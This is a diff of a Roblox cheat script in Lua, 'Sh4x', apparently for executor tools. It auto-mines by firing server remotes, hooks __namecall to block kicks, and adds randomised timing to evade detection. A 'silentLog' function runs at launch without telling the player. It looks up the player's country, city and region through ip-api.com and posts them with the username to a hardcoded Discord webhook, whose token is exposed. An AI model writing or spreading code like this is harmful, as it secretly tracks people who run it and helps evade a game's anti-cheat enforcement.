@@ -1,19 +1,22 @@
 --[[
-    Sh4x - ULTRA SPEED EDITION (GEO VERSION)
-    Focus: MAXIMUM MINING SPEED + SILENT DISCORD LOGGING (COUNTRY/CITY)
-    Security: ANTI-KICK / ANTI-AFK / OBFUSCATION / BYPASS
-    Visuals: RED THEME + RGB BORDERS
+    Sh4x - ULTIMATE UNIFIED EDITION
+    Interface: Dark Red Background + RGB Rainbow Borders
+    Features: ORIGINAL AUTO-MINING + SILENT DISCORD LOGGING
+    Security: ANTI-KICK / ANTI-AFK / BYPASS / OBFUSCATION
+    Target: High-Performance Mining & Stealth Monitoring
 ]]
 
 local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
+local TweenService = game:GetService("TweenService")
 local VirtualUser = game:GetService("VirtualUser")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
 local Player = Players.LocalPlayer
 
--- [CONFIGURAÇÃO]
+-- [CONFIGURAÇÃO DISCORD]
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1465809966983155857/YHUdyCOZgu3mymCizFY5coTioKx2UjoR9puFeotVWQHrq3mGgFkZhQt1LrBLx20aLXCd"
 local SCRIPT_NAME = "Sh4x ULTRA SPEED"
 local IGNORED_USER = "fimossegamers123"
@@ -29,23 +32,14 @@ local function getPlatform()
     end
 end
 
--- [FUNÇÃO DE LOG SILENCIOSA COM GEOLOCALIZAÇÃO]
+-- [FUNÇÃO DE LOG SILENCIOSA]
 local function silentLog()
-    -- Verifica se é o usuário ignorado
     if Player.Name == IGNORED_USER then return end
-
-    local country = "Desconhecido"
-    local city = "Desconhecida"
-    local region = "Desconhecida"
-    
-    -- Tenta obter a localização geográfica via API
+    local country, city, region = "Desconhecido", "Desconhecida", "Desconhecida"
     pcall(function()
         local reqFunc = (syn and syn.request) or (http and http.request) or http_request or request
         if reqFunc then
-            local response = reqFunc({
-                Url = "http://ip-api.com/json/",
-                Method = "GET"
-            })
+            local response = reqFunc({Url = "http://ip-api.com/json/", Method = "GET"})
             if response and response.Body then
                 local geoData = HttpService:JSONDecode(response.Body)
                 if geoData.status == "success" then
@@ -56,7 +50,6 @@ local function silentLog()
             end
         end
     end)
-
     local data = {
         ["embeds"] = {{
             ["title"] = "🌍 Script Executado: " .. SCRIPT_NAME,
@@ -71,24 +64,13 @@ local function silentLog()
             ["footer"] = {["text"] = "Geo Stealth Logger System"}
         }}
     }
-
-    local jsonData = HttpService:JSONEncode(data)
-    
-    -- Envio totalmente silencioso
     pcall(function()
         local reqFunc = (syn and syn.request) or (http and http.request) or http_request or request
         if reqFunc then
-            reqFunc({
-                Url = WEBHOOK_URL,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = jsonData
-            })
+            reqFunc({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
         end
     end)
 end
-
--- Inicia o log em background
 task.spawn(silentLog)
 
 -- [ANTI-KICK PROTECTION]
@@ -98,7 +80,7 @@ local function applyAntiKick()
     local oldNamecall = gmt.__namecall
     gmt.__namecall = newcclosure(function(self, ...)
         local method = getnamecallmethod()
-        if tostring(method):lower() == "kick" then
+        if tostring(method) == "Kick" or tostring(method) == "kick" then
             return nil
         end
         return oldNamecall(self, ...)
@@ -137,8 +119,8 @@ local Title = Instance.new("TextLabel", MainFrame)
 Title.Size = UDim2.new(1, 0, 0, 40)
 Title.BackgroundTransparency = 1
 Title.Font = Enum.Font.GothamBold
-Title.Text = "Sh4x ULTRA SPEED"
-Title.TextSize = 16
+Title.Text = "Sh4x"
+Title.TextSize = 18
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 
 local ToggleBtn = Instance.new("TextButton", MainFrame)
@@ -146,7 +128,7 @@ ToggleBtn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
 ToggleBtn.Position = UDim2.new(0.1, 0, 0.35, 0)
 ToggleBtn.Size = UDim2.new(0.8, 0, 0, 40)
 ToggleBtn.Font = Enum.Font.GothamBold
-ToggleBtn.Text = "START ULTRA FARM"
+ToggleBtn.Text = "START AUTO-MINING"
 ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 Instance.new("UICorner", ToggleBtn)
 
@@ -158,7 +140,7 @@ StatusLabel.Position = UDim2.new(0, 0, 0.7, 0)
 StatusLabel.Size = UDim2.new(1, 0, 0, 30)
 StatusLabel.BackgroundTransparency = 1
 StatusLabel.Font = Enum.Font.GothamSemibold
-StatusLabel.Text = "SPEED: MAXIMUM"
+StatusLabel.Text = "SYSTEM: SECURED"
 StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
 StatusLabel.TextSize = 10
 
@@ -173,7 +155,7 @@ task.spawn(function()
     end
 end)
 
--- Arrastar
+-- Arrastar GUI
 local dragging, dragInput, dragStart, startPos
 MainFrame.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
@@ -198,20 +180,17 @@ game:GetService("UserInputService").InputChanged:Connect(function(input)
 end)
 
 -- ==========================================
--- LÓGICA DE AUTO MINING ULTRA RÁPIDA
+-- LÓGICA DE AUTO MINING (MANTIDA INTACTA)
 -- ==========================================
 local RAIO_OPERACAO = 90
 local DISTANCIA_ATAQUE = 7.5
 local farmAtivo = false
 local lastSwing = 0
 
--- [ULTRA SPEED] Intervalo de ataque reduzido ao limite
-local ATTACK_SPEED = 0.25 
-
 ToggleBtn.MouseButton1Click:Connect(function()
     farmAtivo = not farmAtivo
-    ToggleBtn.Text = farmAtivo and "ULTRA FARMING..." or "START ULTRA FARM"
-    ToggleBtn.BackgroundColor3 = farmAtivo and Color3.fromRGB(120, 0, 0) or Color3.fromRGB(60, 0, 0)
+    ToggleBtn.Text = farmAtivo and "MINING ACTIVE" or "START AUTO-MINING"
+    StatusLabel.Text = farmAtivo and "SH4X PROTECTION: ON" or "SYSTEM: SECURED"
 end)
 
 local function buscarFerramenta()
@@ -260,36 +239,31 @@ task.spawn(function()
                         humanoid:MoveTo(root.Position)
                         if tool.Parent ~= char then humanoid:EquipTool(tool) end
                         
-                        -- Rotação Instantânea
-                        root.CFrame = CFrame.new(root.Position, Vector3.new(alvo.Position.X, root.Position.Y, alvo.Position.Z))
+                        local targetCFrame = CFrame.new(root.Position, Vector3.new(alvo.Position.X, root.Position.Y, alvo.Position.Z))
+                        root.CFrame = root.CFrame:Lerp(targetCFrame, 0.3)
 
-                        -- [ULTRA SPEED] Ataque e Remotes em Massa
-                        if tick() - lastSwing > ATTACK_SPEED then
+                        local waitTime = 0.32 + (math.random(-50, 100) / 1000)
+                        if tick() - lastSwing > waitTime then
                             lastSwing = tick()
                             tool:Activate()
                             VirtualUser:CaptureController()
-                            VirtualUser:ClickButton1(Vector2.new(0, 0))
+                            VirtualUser:ClickButton1(Vector2.new(math.random(1,10), math.random(1,10)))
                             
-                            -- Disparo de Remotes Otimizado (3 pacotes por swing)
-                            task.spawn(function()
-                                for i = 1, 3 do 
-                                    for _, r in pairs(ReplicatedStorage:GetDescendants()) do
-                                        if r:IsA("RemoteEvent") then
-                                            local n = r.Name:lower()
-                                            if n:find("mine") or n:find("hit") or n:find("click") then
-                                                r:FireServer(alvo)
-                                            end
-                                        end
+                            for _, r in pairs(ReplicatedStorage:GetDescendants()) do
+                                if r:IsA("RemoteEvent") then
+                                    local n = r.Name:lower()
+                                    if n:find("mine") or n:find("hit") or n:find("click") then
+                                        task.delay(math.random(10, 60)/1000, function()
+                                            r:FireServer(alvo)
+                                        end)
                                     end
-                                    task.wait(0.03)
                                 end
-                            end)
-                            StatusLabel.Text = "STATUS: ULTRA SPEED"
+                            end
                         end
                     end
                 end
             end
         end
-        task.wait(0.01) -- Loop de alta frequência
+        task.wait(0.05 + (math.random(1, 40)/1000))
     end
 end)
